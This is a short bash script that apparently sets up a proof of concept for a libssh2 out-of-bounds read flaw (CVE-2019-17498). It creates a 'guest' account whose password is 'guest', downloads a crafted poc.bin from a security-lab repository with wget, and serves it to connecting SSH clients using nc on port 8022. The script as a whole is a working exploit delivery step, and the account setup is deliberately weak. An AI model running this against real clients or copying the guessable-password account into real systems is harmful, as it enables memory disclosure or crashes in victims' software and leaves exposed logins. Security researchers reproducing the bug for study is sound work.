#!/bin/bash

# Add user for test
if ! id -u guest; then
  sudo useradd guest -s /bin/bash
  sudo mkdir -p /home/guest/.ssh
  sudo chown -R guest:guest /home/guest/
  echo "guest:guest" | sudo chpasswd
fi

cd /tmp || exit
if [ ! -f poc.bin ]; then
  wget https://raw.githubusercontent.com/kevinbackhouse/security-lab/master/SecurityExploits/libssh2/out_of_bounds_read_disconnect_CVE-2019-17498/server/home/poc.bin
fi
if [ -f poc.bin ]; then
  nc -lp 8022 < poc.bin
fi
